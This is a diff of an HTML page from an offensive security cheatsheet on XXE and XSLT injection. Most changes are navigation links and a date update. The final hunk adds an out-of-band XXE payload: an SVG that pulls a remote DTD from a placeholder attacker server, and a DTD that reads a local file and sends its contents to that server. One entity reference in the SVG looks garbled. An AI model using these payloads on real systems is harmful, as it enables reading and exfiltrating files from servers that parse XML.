@@ -5,7 +5,7 @@
     
       <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
-<meta name="revised" content="2019-07-02T15:56:59 CEST">
+<meta name="revised" content="2019-08-21T14:34:16 CEST">
 <title>XML External Entity (XXE) and XSLT :: Offensive Security Cheatsheet</title>
 <link rel="shortcut icon" href="/images/favicon.png" type="image/x-icon" />
 <link href="/css/font-awesome.min.css" rel="stylesheet">
@@ -978,6 +978,13 @@
           </a><i class="fa fa-circle-thin read-icon"></i>
         </div>
     </li>
+      <li data-nav-id="/windows-systems/exploitation/iis/" class="dd-item">
+        <div>
+          <a href="/windows-systems/exploitation/iis/">
+            IIS
+          </a><i class="fa fa-circle-thin read-icon"></i>
+        </div>
+    </li>
         </ul>
     </li>
     <li data-nav-id="/windows-systems/privilege-escalation/" class="dd-item haschildren
@@ -1040,6 +1047,13 @@
         <div>
           <a href="/windows-systems/post-exploitation-techniques/dc_shadow/">
             DC Shadow
+          </a><i class="fa fa-circle-thin read-icon"></i>
+        </div>
+    </li>
+      <li data-nav-id="/windows-systems/post-exploitation-techniques/searching_informations/" class="dd-item">
+        <div>
+          <a href="/windows-systems/post-exploitation-techniques/searching_informations/">
+            Searching Informations
           </a><i class="fa fa-circle-thin read-icon"></i>
         </div>
     </li>
@@ -1133,10 +1147,17 @@
       <a href="/other-systems/">Other Systems</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
       </div>
         <ul>
-      <li data-nav-id="/other-systems/todo/" class="dd-item">
+      <li data-nav-id="/other-systems/ipbx/" class="dd-item">
         <div>
-          <a href="/other-systems/todo/">
+          <a href="/other-systems/ipbx/">
             IPBX
+          </a><i class="fa fa-circle-thin read-icon"></i>
+        </div>
+    </li>
+      <li data-nav-id="/other-systems/misc/" class="dd-item">
+        <div>
+          <a href="/other-systems/misc/">
+            MISC
           </a><i class="fa fa-circle-thin read-icon"></i>
         </div>
     </li>
@@ -1166,6 +1187,13 @@
         <div>
           <a href="/passcracking-hashfiles/cracking_files/">
             Cracking files
+          </a><i class="fa fa-circle-thin read-icon"></i>
+        </div>
+    </li>
+      <li data-nav-id="/passcracking-hashfiles/wordlists/" class="dd-item">
+        <div>
+          <a href="/passcracking-hashfiles/wordlists/">
+            Wordlists &amp; Co
           </a><i class="fa fa-circle-thin read-icon"></i>
         </div>
     </li>
@@ -1220,6 +1248,13 @@
         </div>
     </li>
         </ul>
+    </li>
+      <li data-nav-id="/pwn/general_infos/" class="dd-item">
+        <div>
+          <a href="/pwn/general_infos/">
+            General Informations
+          </a><i class="fa fa-circle-thin read-icon"></i>
+        </div>
     </li>
         </ul>
     </li>
@@ -1353,6 +1388,24 @@
 <span style="color:#75715e">&lt;!ENTITY sp SYSTEM &#34;nc -nlvp 31337&#34;&gt;</span>
 ]&gt;
 <span style="color:#f92672">&lt;r&gt;</span><span style="color:#111">&amp;sp;</span><span style="color:#f92672">&lt;/r&gt;</span></code></pre></div>
+<p><br/></p>
+
+<h3 id="out-of-band-xxe-oob-xxe">Out of Band XXE (OOB XXE)</h3>
+<div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># The exploitation will download a remote DTD file</span>
+<span style="color:#75715e"># And then execute entities</span>
+
+<span style="color:#75715e"># SVG File</span>
+&lt;!DOCTYPE svg <span style="color:#f92672">[</span>
+&lt;!ENTITY % file SYSTEM <span style="color:#d88200">&#34;http://ip_server/file.dtd&#34;</span>
+%file%template<span style="color:#111">;</span>
+<span style="color:#f92672">]</span>&gt;
+&lt;svg <span style="color:#111">xmlns</span><span style="color:#f92672">=</span><span style="color:#d88200">&#34;http://www.w3.org/2000/svg&#34;</span>&gt;
+	&lt;text <span style="color:#111">x</span><span style="color:#f92672">=</span><span style="color:#d88200">&#34;10&#34;</span> <span style="color:#111">y</span><span style="color:#f92672">=</span><span style="color:#d88200">&#34;30&#34;</span>&gt;Injected : ùres<span style="color:#111">;</span>&lt;/text&gt;
+&lt;/svg&gt;
+
+<span style="color:#75715e"># DTD file</span>
+&lt;!ENTITY % secret1 SYSTEM <span style="color:#d88200">&#34;file:///flag.txt&#34;</span>&gt;
+&lt;!ENTITY % template <span style="color:#d88200">&#34;&lt;!ENTITY res SYSTEM &#39;http://ip_server/?data=%secret1;&#39;&gt;&#34;</span>&gt;</code></pre></div>
 <p><br/></p>
 
 <h3 id="xslt-injection">XSLT Injection</h3>
